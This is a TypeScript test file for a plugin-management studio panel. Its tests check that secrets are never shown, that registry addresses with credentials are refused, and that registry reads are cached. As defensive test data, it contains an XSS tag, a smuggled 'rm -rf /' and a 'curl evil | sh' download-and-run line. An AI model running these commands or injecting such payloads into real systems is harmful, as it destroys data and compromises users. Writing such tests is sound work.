import { FakeClock } from "@facetdb/core/testing";
import { describe, expect, it } from "vitest";
import { env, facetdb, noul, type ProjectConfig } from "../../config/index.ts";
import { VERSION } from "../../index.ts";
import {
  action,
  createPluginHost,
  definePlugin,
  type Plugin,
  type PluginHost,
  pack,
  z,
} from "../../plugin/index.ts";
import {
  createPluginsDoor,
  DEFAULT_REGISTRY,
  REGISTRY_CACHE_MS,
  registryAddress,
} from "./plugins-door.ts";

/**
 * The studio's Plugins door: a fixture plugin with a nested secret, a secret inside a list and a
 * pack goes through the real host, and what the door answers holds the variables' names and whether
 * each is set, never a value; the gallery searches the registry's entries as data, builds its
 * command from the entry's checked name, and reads the index no more than every ten minutes on the
 * clock it is given. Nothing here reaches a network: the fetch is a handwritten fake.
 */

const PROJECT_DIR = "/work/shop";
const TOKEN = "ghp_s3cret-github-token";
const HOOK_SECRET = "hook-s3cret-signing-key";
const REPO_URL = "acme/web";
/** Values the response must never carry, whole or by their first characters. */
const FORBIDDEN = [TOKEN, HOOK_SECRET, "s3cret"];

const noop = async () => undefined;

const github = definePlugin({
  name: "github",
  version: "1.2.0",
  facetdb: ">=0.0.0 <1.0.0",
  config: z.object({
    repo: z.string(),
    auth: z.object({ token: z.secret() }),
    hooks: z.array(z.object({ url: z.string(), secret: z.secret() })).optional(),
    pageSize: z.number().default(50),
  }),
  actions: { label: action({ config: z.object({ add: z.string() }), run: noop }) },
  packs: {
    triage: pack({
      description: "Sort new issues into bugs and requests.",
      reads: ["title", "body"],
      questions: {
        is_bug: noul("Does the issue report a bug?", {
          stakes: "high",
          thresholds: { yesAbove: 0.95, noBelow: 0.1 },
        }),
        is_request: noul("Does the issue ask for a feature?"),
      },
    }),
    plain: pack({ questions: { is_spam: noul("Is it spam?") } }),
  },
});

/** A second plugin, installed but with no settings and no pack: only its entry appears in a list. */
const slack = definePlugin({
  name: "slack",
  version: "0.3.0",
  facetdb: "*",
  config: z.object({}),
  actions: { post: action({ config: z.object({}), run: noop }) },
});

const INSTALLED: Readonly<Record<string, Plugin>> = {
  "@facetdb/github": github,
  "@facetdb/slack": slack,
};

function project(): ProjectConfig {
  return facetdb({
    model: "jev-1.14.0",
    plugins: {
      github: {
        repo: REPO_URL,
        auth: { token: env("GITHUB_TOKEN") },
        hooks: [{ url: "https://example.com/hook", secret: env("HOOK_SECRET") }],
      },
      slack: {},
    },
    sources: [
      {
        name: "tickets",
        api: true,
        read: ["body"],
        questions: { urgent: noul("Is this urgent?") },
      },
    ],
  });
}

async function hostFor(environment: Readonly<Record<string, string | undefined>>) {
  return createPluginHost({
    config: project(),
    env: environment,
    projectDir: PROJECT_DIR,
    coreVersion: VERSION,
    importModule: async (specifier) => {
      const plugin = INSTALLED[specifier];
      if (plugin !== undefined) {
        return { default: plugin };
      }
      throw Object.assign(new Error(`Cannot find package '${specifier}'`), {
        code: "ERR_MODULE_NOT_FOUND",
      });
    },
    builtins: {},
  });
}

/** One entry as the registry's index writes it. */
function entry(name: string, more: Record<string, unknown> = {}) {
  return {
    name,
    package: `@facetdb/${name}`,
    description: `Does what ${name} does.`,
    kinds: ["action"],
    facetdb: ">=0.0.0 <1.0.0",
    verified: false,
    downloads: 10,
    ...more,
  };
}

function indexText(plugins: readonly unknown[], format = 1): string {
  return JSON.stringify({ format, generatedAt: "2026-11-13T09:00:00.000Z", plugins });
}

const REGISTRY = "https://registry.example.com/index.json";

/** The fetch as a recorder: what it was asked, and the answer the test hands back, per call. */
function network(respond: (url: string) => Promise<Response> | Response) {
  const asked: { url: string; signal: AbortSignal }[] = [];
  return {
    asked,
    fetch: async (url: string, init: { readonly signal: AbortSignal }) => {
      asked.push({ url, signal: init.signal });
      return respond(url);
    },
  };
}

type Setup = {
  readonly environment?: Record<string, string | undefined>;
  readonly host?: PluginHost;
  readonly registry?: string;
  readonly clock?: FakeClock;
  readonly abortAfter?: (ms: number) => AbortSignal;
  /** Files of the project's directory, by path: a registry that is a file is read from here. */
  readonly files?: Readonly<Record<string, string>>;
};

async function doorWith(net: ReturnType<typeof network>, setup: Setup = {}) {
  const environment = setup.environment ?? { GITHUB_TOKEN: TOKEN, HOOK_SECRET };
  const clock = setup.clock ?? new FakeClock(0);
  const timeouts: number[] = [];
  const door = createPluginsDoor({
    host: setup.host ?? (await hostFor(environment)),
    env: environment,
    coreVersion: VERSION,
    registry: setup.registry ?? REGISTRY,
    fetch: net.fetch,
    abortAfter:
      setup.abortAfter ??
      ((ms) => {
        timeouts.push(ms);
        return new AbortController().signal;
      }),
    workspace: {
      peek: (path) =>
        Promise.resolve(
          setup.files !== undefined && path in setup.files
            ? { kind: "file", firstLine: "{" }
            : { kind: "none" },
        ),
      lines: async function* (path) {
        yield* (setup.files?.[path] ?? "").split("\n");
      },
    },
    clock,
  });
  return { door, clock, environment, timeouts };
}

const NO_NETWORK = network(() => {
  throw new Error("this test reads no registry");
});

function noValueIn(answer: unknown) {
  const text = JSON.stringify(answer);
  for (const value of FORBIDDEN) {
    expect(text).not.toContain(value);
  }
}

describe("the registry's address", () => {
  it("is FACETDB_REGISTRY when it is set and not empty, else the default", () => {
    expect(registryAddress({})).toBe(DEFAULT_REGISTRY);
    expect(registryAddress({ FACETDB_REGISTRY: "" })).toBe(DEFAULT_REGISTRY);
    expect(registryAddress({ FACETDB_REGISTRY: REGISTRY })).toBe(REGISTRY);
  });
});

describe("the installed plugins", () => {
  it("lists each hosted plugin with what it provides, its core range and its settings as a schema", async () => {
    const { door } = await doorWith(NO_NETWORK);

    const [first, second] = door.installed();
    expect(door.installed().map((plugin) => plugin.name)).toEqual(["github", "slack"]);
    expect(first).toMatchObject({
      name: "github",
      package: "@facetdb/github",
      version: "1.2.0",
      kinds: ["action", "pack"],
      provides: {
        source: [],
        action: ["label"],
        channel: [],
        provider: [],
        pack: ["triage", "plain"],
      },
      core: { range: ">=0.0.0 <1.0.0", holds: true },
    });
    expect(second).toMatchObject({
      name: "slack",
      package: "@facetdb/slack",
      settings: { values: {}, variables: [] },
    });
    expect(NO_NETWORK.asked).toEqual([]);
  });

  it("draws the form from the one schema: a secret field says so, a default makes a field optional", async () => {
    const { door } = await doorWith(NO_NETWORK);
    const schema = door.installed()[0]?.settings.schema as {
      properties: Record<string, Record<string, unknown>>;
      required: string[];
    };

    expect(schema.properties["repo"]).toMatchObject({ type: "string" });
    expect(schema.properties["auth"]).toMatchObject({
      properties: { token: { type: "string", secret: true } },
    });
    expect(schema.properties["pageSize"]).toMatchObject({ type: "number", default: 50 });
    expect(schema.required).toEqual(["repo", "auth"]);
    // It crosses the wire as JSON.
    expect(JSON.parse(JSON.stringify(schema))).toEqual(schema);
  });

  it("shows the settings as the file writes them and each variable by name, path and whether it is set", async () => {
    const { door, environment } = await doorWith(NO_NETWORK);

    const settings = door.installed()[0]?.settings;
    expect(settings?.values).toEqual({
      repo: REPO_URL,
      auth: { token: { env: "GITHUB_TOKEN" } },
      hooks: [{ url: "https://example.com/hook", secret: { env: "HOOK_SECRET" } }],
    });
    expect(settings?.variables).toEqual([
      { path: "auth.token", variable: "GITHUB_TOKEN", secret: true, set: true },
      { path: "hooks[0].secret", variable: "HOOK_SECRET", secret: true, set: true },
    ]);

    // The worker's environment is asked on each request: a variable that went away reads unset.
    delete environment["HOOK_SECRET"];
    environment["GITHUB_TOKEN"] = "";
    expect(door.installed()[0]?.settings.variables).toEqual([
      { path: "auth.token", variable: "GITHUB_TOKEN", secret: true, set: false },
      { path: "hooks[0].secret", variable: "HOOK_SECRET", secret: true, set: false },
    ]);
  });

  it("never lets a variable's value leave, in the plugins, the packs or the gallery", async () => {
    const net = network(
      () => new Response(indexText([entry("github", { package: "@facetdb/github" })])),
    );
    const { door } = await doorWith(net);

    noValueIn(door.installed());
    noValueIn(door.packs());
    noValueIn(await door.gallery(undefined));
  });
});

describe("the packs", () => {
  it("lists each pack of each hosted plugin, its questions keyed by name, its thresholds apart and the fields it reads", async () => {
    const { door } = await doorWith(NO_NETWORK);

    expect(door.packs()).toEqual([
      {
        plugin: "github",
        package: "@facetdb/github",
        name: "triage",
        description: "Sort new issues into bugs and requests.",
        reads: ["title", "body"],
        questions: {
          is_bug: { type: "noul", instructions: "Does the issue report a bug?", stakes: "high" },
          is_request: {
            type: "noul",
            instructions: "Does the issue ask for a feature?",
            stakes: "low",
          },
        },
        thresholds: { is_bug: { yesAbove: 0.95, noBelow: 0.1 } },
      },
      {
        plugin: "github",
        package: "@facetdb/github",
        name: "plain",
        description: null,
        // A pack that does not say what it reads: null, never a guess.
        reads: null,
        questions: { is_spam: { type: "noul", instructions: "Is it spam?", stakes: "low" } },
        thresholds: {},
      },
    ]);
  });
});

describe("the gallery", () => {
  const INDEX = indexText([
    entry("github", { kinds: ["action", "source"], verified: true, downloads: 4200 }),
    entry("slack", { kinds: ["channel"], description: "Post alerts to a Slack channel." }),
    entry("zendesk", {
      package: "facetdb-plugin-zendesk",
      kinds: ["source"],
      description: "Read tickets.",
      homepage: "https://example.com/zendesk",
    }),
  ]);

  it("lists every entry with its verified mark, downloads, whether it is installed and the add command", async () => {
    const net = network(() => new Response(INDEX));
    const { door, timeouts } = await doorWith(net);

    expect(await door.gallery(undefined)).toEqual({
      reachable: true,
      address: REGISTRY,
      plugins: [
        {
          name: "github",
          package: "@facetdb/github",
          description: "Does what github does.",
          kinds: ["action", "source"],
          facetdb: ">=0.0.0 <1.0.0",
          verified: true,
          downloads: 4200,
          homepage: null,
          installed: true,
          command: "facetdb add github",
        },
        {
          name: "slack",
          package: "@facetdb/slack",
          description: "Post alerts to a Slack channel.",
          kinds: ["channel"],
          facetdb: ">=0.0.0 <1.0.0",
          verified: false,
          downloads: 10,
          homepage: null,
          installed: true,
          command: "facetdb add slack",
        },
        {
          name: "zendesk",
          package: "facetdb-plugin-zendesk",
          description: "Read tickets.",
          kinds: ["source"],
          facetdb: ">=0.0.0 <1.0.0",
          verified: false,
          downloads: 10,
          homepage: "https://example.com/zendesk",
          installed: false,
          command: "facetdb add zendesk",
        },
      ],
    });
    // The one address it was given, and a timeout on the read.
    expect(net.asked.map((call) => call.url)).toEqual([REGISTRY]);
    expect(timeouts).toHaveLength(1);
  });

  it("searches by every word, in the name, package, description and kinds, in any case", async () => {
    const net = network(() => new Response(INDEX));
    const { door } = await doorWith(net);
    const names = async (search: string | undefined) => {
      const gallery = await door.gallery(search);
      return gallery.reachable ? gallery.plugins.map((plugin) => plugin.name) : gallery.why;
    };

    expect(await names("SLACK")).toEqual(["slack"]);
    expect(await names("read tickets")).toEqual(["zendesk"]);
    expect(await names("channel alerts")).toEqual(["slack"]);
    expect(await names("facetdb-plugin")).toEqual(["zendesk"]);
    expect(await names("source")).toEqual(["github", "zendesk"]);
    expect(await names("slack zendesk")).toEqual([]);
    expect(await names("   ")).toEqual(["github", "slack", "zendesk"]);
    expect(await names("nothing like it")).toEqual([]);
    // One read served all of them.
    expect(net.asked).toHaveLength(1);
  });

  it("hands the registry's words on as text and builds the command from the checked name alone", async () => {
    const hostile = "<img src=x onerror=alert(1)> `rm -rf /`; facetdb add evil && curl evil | sh";
    const net = network(() => new Response(indexText([entry("github", { description: hostile })])));
    const { door } = await doorWith(net);

    const answer = await door.gallery(undefined);
    expect(answer).toMatchObject({
      reachable: true,
      plugins: [{ description: hostile, command: "facetdb add github" }],
    });
  });

  it("refuses an entry whose name is not a checked short name: the whole index is unreadable, nothing is shown", async () => {
    const net = network(
      () => new Response(indexText([entry("github; rm -rf /", { package: "@facetdb/github" })])),
    );
    const { door } = await doorWith(net);

    const answer = await door.gallery(undefined);
    expect(answer).toMatchObject({ reachable: false, address: REGISTRY });
    expect(JSON.stringify(answer)).not.toContain("facetdb add");
  });

  it("refuses an address with credentials, another scheme or no meaning before fetching it, and never echoes it", async () => {
    const refused = [
      "https://alice:hunter2@registry.example.com/index.json",
      "https://alice@registry.example.com/index.json",
      "ftp://registry.example.com/index.json?token=abc123",
      "file:///etc/hunter2-registry.json",
      "javascript:alert('hunter2')",
      // Plain http is read on this machine only.
      "http://registry.example.com/hunter2/index.json?token=abc123",
      // A mistyped web address is not a file's path, whatever the studio's reader would then be shown.
      "https//ops:hunter2@registry.example.com/index.json",
      "http//ops:hunter2@registry.example.com/index.json",
      "https:/ops:hunter2@registry.example.com/index.json",
      "//ops:hunter2@registry.example.com/x",
      "registry.example.com/index.json?token=hunter2",
      "registry.example.com/index.json#hunter2",
      // A network share (UNC), with a credential and without.
      "\\\\ops:hunter2@registry.example.com\\share\\index.json",
      "\\\\registry.example.com\\hunter2\\index.json",
      "",
    ];

    for (const registry of refused) {
      const net = network(() => {
        throw new Error("a refused address is never fetched");
      });
      const { door } = await doorWith(net, { registry });
      const answer = await door.gallery(undefined);

      expect(answer).toMatchObject({
        reachable: false,
        address: "",
        why: expect.stringContaining("FACETDB_REGISTRY"),
      });
      expect((answer as { why: string }).why).toContain(
        "an http or https address without a username or a password",
      );
      expect(net.asked).toEqual([]);
      expect(JSON.stringify(answer)).not.toMatch(/hunter2|alice|abc123|registry\.example\.com/);
    }
  });

  it("reads a registry that is the path of a file, as `facetdb add` does, and fetches nothing", async () => {
    // These two were refused as "not an http or https address" when the door alone read the
    // registry; `facetdb add --registry <file>` reads them, so the gallery does too. A value with a
    // space and no path shape ("not a url hunter2.json") is a file's name, and the page is never
    // shown a file's path: its `address` is fixed words.
    for (const path of ["registry/index.json", "not a url hunter2.json"]) {
      const net = network(() => {
        throw new Error("a file is never fetched");
      });
      const { door } = await doorWith(net, {
        registry: path,
        files: { [path]: INDEX },
      });
      const answer = await door.gallery("github");
      expect(answer).toMatchObject({
        reachable: true,
        address: "a file in the project directory",
        plugins: [{ name: "github" }],
      });
      expect(JSON.stringify(answer)).not.toMatch(/hunter2|registry\/index/);
      expect(net.asked).toEqual([]);
    }
    const { door } = await doorWith(NO_NETWORK, { registry: "missing/hunter2/index.json" });
    const missing = await door.gallery(undefined);
    expect(missing).toMatchObject({
      reachable: false,
      address: "a file in the project directory",
      why: "the registry file does not exist",
    });
    expect(JSON.stringify(missing)).not.toContain("hunter2");
  });

  it("says why when the registry cannot be read, in fixed words, with the address tried and nothing a failure quotes", async () => {
    // Node's fetch names the whole address in the error it throws for credentials; a token in the
    // query is quoted the same way by an HTTP library that echoes the URL.
    const registry = "https://registry.example.com/index.json?token=abc123#frag";
    const quoting = (url: string) =>
      new Error(`Request cannot be constructed from a URL that includes credentials: ${url}`);
    const cases: readonly [(url: string) => Promise<Response> | Response, string][] = [
      [(url) => Promise.reject(quoting(url)), "the registry could not be reached"],
      [
        () => Promise.reject(new DOMException("The operation timed out abc123", "TimeoutError")),
        "did not answer within 10 seconds",
      ],
      [() => new Response("nope", { status: 503 }), "HTTP status 503"],
      [() => new Response("<html>not json</html>"), "cannot be read"],
      [() => new Response(indexText([], 2)), "upgrade facetdb"],
      [() => new Response(JSON.stringify({ format: 1, plugins: [{}] })), "cannot be read"],
    ];

    for (const [respond, words] of cases) {
      const { door } = await doorWith(network(respond), { registry });
      const answer = await door.gallery("anything");
      expect(answer).toMatchObject({
        reachable: false,
        address: "https://registry.example.com/index.json",
      });
      expect((answer as { why: string }).why).toContain(words);
      expect(JSON.stringify(answer)).not.toMatch(/abc123|frag/);
      expect((answer as { why: string }).why.length).toBeLessThanOrEqual(303);
    }
  });

  it("replaces the raw registry value with the address as shown wherever the index quotes it", async () => {
    const registry = "https://registry.example.com/index.json?token=abc123";
    const quoting = JSON.stringify({
      format: 1,
      generatedAt: "2026-11-13T09:00:00.000Z",
      plugins: [],
      [registry]: true,
    });
    const { door } = await doorWith(
      network(() => new Response(quoting)),
      { registry },
    );

    const answer = await door.gallery(undefined);
    expect(answer).toMatchObject({
      reachable: false,
      why: expect.stringContaining('unknown field "https://registry.example.com/index.json"'),
    });
    expect(JSON.stringify(answer)).not.toContain("abc123");
  });

  it("names FACETDB_REGISTRY in the reason only when the default address is the one that failed", async () => {
    const down = () => Promise.reject(new Error("getaddrinfo ENOTFOUND"));
    const byDefault = await doorWith(network(down), { registry: DEFAULT_REGISTRY });
    const named = await doorWith(network(down), { registry: REGISTRY });

    expect(await byDefault.door.gallery(undefined)).toMatchObject({
      reachable: false,
      address: DEFAULT_REGISTRY,
      why: "the registry could not be reached; FACETDB_REGISTRY sets another address",
    });
    expect(await named.door.gallery(undefined)).toMatchObject({
      reachable: false,
      why: "the registry could not be reached",
    });
  });

  it("@timing answers reachable false, never an error, when a read fails some other way, and keeps that answer as it keeps any", async () => {
    let signals = 0;
    const net = network(() => new Response(indexText([entry("github")])));
    const clock = new FakeClock(1_000_000);
    const { door } = await doorWith(net, {
      clock,
      abortAfter: () => {
        signals += 1;
        if (signals === 1) {
          throw new Error(`boom ${REGISTRY}?token=abc123`);
        }
        return new AbortController().signal;
      },
    });

    const failed = { reachable: false, why: "the registry could not be reached" };
    expect(await door.gallery(undefined)).toMatchObject(failed);
    // Kept for the window as a plain answer, not a rejection that would make every call a 500.
    clock.advance(REGISTRY_CACHE_MS - 1);
    expect(await door.gallery(undefined)).toMatchObject(failed);
    expect(signals).toBe(1);
    clock.advance(1);
    expect(await door.gallery(undefined)).toMatchObject({ reachable: true });
    expect(signals).toBe(2);
  });

  it("answers reachable false in fixed words for a response that fails when it is read, never a rejection", async () => {
    const broken = {
      get ok(): boolean {
        throw new Error(`boom ${REGISTRY}?token=abc123`);
      },
    } as unknown as Response;
    const { door } = await doorWith(network(() => broken));

    const answer = await door.gallery(undefined);
    expect(answer).toMatchObject({ reachable: false, why: "the registry could not be read" });
    // A second request is the same kept answer, not an error.
    expect(await door.gallery("github")).toEqual(answer);
    expect(JSON.stringify(answer)).not.toContain("abc123");
  });

  it("does not read an index larger than it will hold", async () => {
    const net = network(() => new Response(" ".repeat(2_000_001)));
    const { door } = await doorWith(net);

    expect(await door.gallery(undefined)).toMatchObject({
      reachable: false,
      why: expect.stringContaining("larger than"),
    });
  });

  it("marks an entry installed by its package, not by a short name another package shares", async () => {
    // The config hosts @facetdb/github; the registry's `github` entry lives in another package.
    const net = network(
      () => new Response(indexText([entry("github", { package: "facetdb-plugin-github" })])),
    );
    const { door } = await doorWith(net);

    expect(await door.gallery(undefined)).toMatchObject({
      plugins: [{ name: "github", installed: false }],
    });
  });

  it("@timing reads the index at most every ten minutes, one read shared by requests at once, a failure kept as long", async () => {
    let answer = (): Response => new Response(INDEX);
    const net = network(() => answer());
    const clock = new FakeClock(1_000_000);
    const { door } = await doorWith(net, { clock });

    // Three requests at once are one read.
    await Promise.all([door.gallery(undefined), door.gallery("slack"), door.gallery("zendesk")]);
    expect(net.asked).toHaveLength(1);

    clock.advance(REGISTRY_CACHE_MS - 1);
    await door.gallery(undefined);
    expect(net.asked).toHaveLength(1);

    clock.advance(1);
    await door.gallery(undefined);
    expect(net.asked).toHaveLength(2);

    // The registry goes down: the next read fails, and that answer is kept for ten minutes too.
    answer = () => new Response("down", { status: 502 });
    clock.advance(REGISTRY_CACHE_MS);
    expect(await door.gallery(undefined)).toMatchObject({ reachable: false });
    expect(net.asked).toHaveLength(3);
    answer = () => new Response(INDEX);
    clock.advance(REGISTRY_CACHE_MS - 1);
    expect(await door.gallery(undefined)).toMatchObject({ reachable: false });
    expect(net.asked).toHaveLength(3);
    clock.advance(1);
    expect(await door.gallery(undefined)).toMatchObject({ reachable: true });
    expect(net.asked).toHaveLength(4);
  });
});
